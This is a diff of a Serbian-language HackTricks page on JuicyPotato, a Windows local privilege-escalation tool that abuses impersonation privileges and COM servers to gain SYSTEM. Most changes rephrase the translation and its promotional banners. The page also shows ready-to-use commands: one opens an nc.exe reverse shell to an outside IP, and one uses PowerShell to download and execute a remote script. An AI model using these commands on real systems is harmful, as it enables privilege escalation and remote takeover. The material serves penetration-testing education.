@@ -4,19 +4,19 @@
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grupi** ili **telegram grupi** ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova** na [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud).
+* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repozitorijumu**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijumu**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) je pretraživač na **dark vebu** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **kompromitovani** od strane **malvera za krađu podataka**.
+[**WhiteIntel**](https://whiteintel.io) je pretraživač na **dark vebu** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **ugroženi** od **malvera za krađu podataka**.
 
 Primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomvera koji proizilaze iz malvera za krađu informacija.
 
@@ -24,10 +24,10 @@ Možete posetiti njihovu veb lokaciju i isprobati njihovu mašinu za **besplatno
 
 {% embed url="https://whiteintel.io" %}
 
----
+***
 
 {% hint style="warning" %}
-**JuicyPotato ne radi** na Windows Serveru 2019 i Windows 10 verziji 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) mogu se koristiti za **iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`**. _**Proverite:**_
+**JuicyPotato ne radi** na Windows Serveru 2019 i Windows 10 verziji 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) se mogu koristiti za **iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`**. _**Proverite:**_
 {% endhint %}
 
 {% content-ref url="roguepotato-and-printspoofer.md" %}
@@ -36,7 +36,7 @@ Možete posetiti njihovu veb lokaciju i isprobati njihovu mašinu za **besplatno
 
 ## Sočni krompir (zloupotreba zlatnih privilegija) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
 
-_Šećerom prekrivena verzija_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, sa malo soka, tj. **još jedan alat za lokalno eskaliranje privilegija, od Windows servisnih naloga do NT AUTHORITY\SYSTEM**_
+_Šećerom prekrivena verzija_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, sa malo soka, tj. **još jedan alat za eskalaciju privilegija na lokalnom nivou, od Windows servisnih naloga do NT AUTHORITY\SYSTEM**_
 
 #### Možete preuzeti sočni krompir sa [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)
 
@@ -44,19 +44,19 @@ _Šećerom prekrivena verzija_ [_RottenPotatoNG_](https://github.com/breenmachin
 
 [**Iz sočnog krompira Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**
 
-[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i njegovi [varijanti](https://github.com/decoder-it/lonelypotato) iskorišćavaju lanac eskalacije privilegija zasnovan na [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [servisu](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) koji ima MiTM slušaoca na `127.0.0.1:6666` i kada imate privilegije `SeImpersonate` ili `SeAssignPrimaryToken`. Tokom pregleda Windows izgradnje otkrili smo postavku gde je `BITS` namerno onemogućen i port `6666` je zauzet.
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i njegove [varijante](https://github.com/decoder-it/lonelypotato) iskorišćavaju lanac eskalacije privilegija zasnovan na [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [servisu](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) koji ima MiTM slušaoca na `127.0.0.1:6666` i kada imate privilegije `SeImpersonate` ili `SeAssignPrimaryToken`. Tokom pregleda Windows izgradnje otkrili smo postavku gde je `BITS` namerno onemogućen i port `6666` je zauzet.
 
 Odlučili smo da oružamo [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Pozdravite Sočni Krompir**.
 
-> Za teoriju, pogledajte [Rotten Krompir - Eskalacija privilegija od servisnih naloga do SISTEMA](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i pratite lanac veza i referenci.
+> Za teoriju, pogledajte [Rotten Krompir - Eskalacija privilegija sa servisnih naloga na SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i pratite lanac veza i referenci.
 
-Otkrili smo da, osim `BITS`-a, postoji nekoliko COM servera koje možemo zloupotrebiti. Samo treba da:
+Otkrili smo da, osim `BITS`, postoji nekoliko COM servera koje možemo zloupotrebiti. Samo treba da:
 
 1. budu instancirani od strane trenutnog korisnika, obično "servisnog korisnika" koji ima privilegije impersonacije
 2. implementiraju `IMarshal` interfejs
-3. pokreću se kao privilegovan korisnik (SISTEM, Administrator, …)
+3. pokreću se kao privilegovan korisnik (SYSTEM, Administrator, …)
 
-Nakon nekih testiranja dobili smo i testirali obimnu listu [interesantnih CLSID-ova](http://ohpe.it/juicy-potato/CLSID/) na nekoliko verzija Windowsa.
+Nakon nekih testiranja smo dobili i testirali obimnu listu [interesantnih CLSID-ova](http://ohpe.it/juicy-potato/CLSID/) na nekoliko verzija Windowsa.
 
 ### Sočni detalji <a href="#juicy-details" id="juicy-details"></a>
 
@@ -69,12 +69,12 @@ Sočni krompir vam omogućava da:
 * `CreateProcessWithToken` (potrebno je `SeImpersonate`)
 * `CreateProcessAsUser` (potrebno je `SeAssignPrimaryToken`)
 * `oba`
-* **Proces za pokretanje** _pokrenite izvršnu datoteku ili skriptu ako iskorišćavanje uspe_
+* **Proces za pokretanje** _pokrenite izvršnu datoteku ili skriptu ako eksploatacija uspe_
 * **Argument procesa** _prilagodite argumente pokrenutog procesa_
-* **RPC Server adresa** _za prikriveni pristup možete se autentifikovati na spoljni RPC server_
-* **RPC Server port** _korisno ako želite da se autentifikujete na spoljni server a firewall blokira port `135`…_
+* **RPC Server adresa** _za prikriven pristup možete se autentifikovati na eksterni RPC server_
+* **RPC Server port** _korisno ako želite da se autentifikujete na eksterni server a firewall blokira port `135`…_
 * **TEST režim** _pretežno za testiranje, tj. testiranje CLSID-ova. Kreira DCOM i ispisuje korisnika tokena. Pogledajte_ [_ovde za testiranje_](http://ohpe.it/juicy-potato/Test/)
-### Upotreba <a href="#usage" id="usage"></a>
+### Upotreba <a href="#upotreba" id="upotreba"></a>
 ```
 T:\>JuicyPotato.exe
 JuicyPotato v0.1
@@ -97,7 +97,7 @@ Optional args:
 
 Ako korisnik ima privilegije `SeImpersonate` ili `SeAssignPrimaryToken`, tada ste **SYSTEM**.
 
-Gotovo je nemoguće sprečiti zloupotrebu svih ovih COM servera. Možete razmisliti o izmeni dozvola ovih objekata putem `DCOMCNFG`, ali srećno, ovo će biti izazovno.
+Gotovo je nemoguće sprečiti zloupotrebu svih ovih COM servera. Možete razmisliti o izmeni dozvola ovih objekata putem `DCOMCNFG`, ali srećno, to će biti izazovno.
 
 Stvarno rešenje je zaštita osetljivih naloga i aplikacija koje se izvršavaju pod nalozima `* SERVICE`. Zaustavljanje `DCOM` bi svakako sprečilo ovu eksploataciju, ali bi moglo imati ozbiljan uticaj na osnovni OS.
 
@@ -107,7 +107,7 @@ Od: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
 Napomena: Posetite [ovu stranicu](https://ohpe.it/juicy-potato/CLSID/) za listu CLSID-ova koje možete isprobati.
 
-### Dobijanje nc.exe reverse shell
+### Dobijanje reverznog shell-a pomoću nc.exe
 ```
 c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
 
@@ -120,15 +120,13 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 
 c:\Users\Public>
 ```
-### Powershell rev
-
-### Powershell rev
+### Powershell povratna vrijednost
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
 ### Pokrenite novi CMD (ako imate RDP pristup)
 
-![](<../../.gitbook/assets/image (297).png>)
+![](<../../.gitbook/assets/image (300).png>)
 
 ## Problemi sa CLSID-om
 
@@ -152,11 +150,11 @@ Zatim preuzmite [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/mas
 
 ### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) je pretraživač pokretan **dark-webom** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **kompromitovani** od strane **malvera za krađu podataka**.
+[**WhiteIntel**](https://whiteintel.io) je pretraživač pokretan **dark-webom** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **ugroženi** od **malvera koji kradu informacije**.
 
-Njihov primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomware-a koji proizilaze iz malvera za krađu informacija.
+Primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomware-a koji proizilaze iz malvera koji kradu informacije.
 
 Možete posetiti njihovu veb lokaciju i isprobati njihov pretraživač **besplatno** na:
 
@@ -167,9 +165,9 @@ Možete posetiti njihovu veb lokaciju i isprobati njihov pretraživač **besplat
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 * Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS-a ili preuzimanje HackTricks-a u PDF-u**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikova slanjem PR-ova u** [**repozitorijum hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozitorijum hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repozitorijumu**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijumu**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
